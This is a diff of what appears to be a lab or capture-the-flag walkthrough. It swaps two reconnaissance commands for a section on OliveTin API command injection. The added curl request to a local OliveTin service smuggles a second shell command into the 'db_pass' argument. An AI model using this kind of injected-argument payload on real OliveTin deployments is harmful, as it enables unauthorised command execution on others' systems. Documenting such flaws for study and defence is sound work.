@@ -381,19 +381,20 @@ curl http://127.0.0.1:1337/
 But in a controlled manner (using predefined commands)
 
 
-```
-find / -name "*olive*" 2>/dev/null
-```
-
-<img width="917" height="143" alt="image" src="https://github.com/user-attachments/assets/915e43bc-98d1-466d-8327-f9ab0920c906" />
+## OliveTin API Command Injection
 
 ```
-ls -la /opt/OliveTin/OliveTin-linux-amd64/var/helper-actions/
+curl -s -X POST \
+  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
+  -H 'Content-Type: application/json' \
+  -d '{"actionId":"backup_database","arguments":[
+    {"name":"db_user","value":"backup_svc"},
+    {"name":"db_pass","value":"x'\'' ; id ; #"},
+    {"name":"db_name","value":"production"}
+  ]}'
 ```
 
-
-
-
+<img width="1679" height="306" alt="image" src="https://github.com/user-attachments/assets/1f3cdb80-cdd4-48c7-af94-297b13954395" />
 
 
 
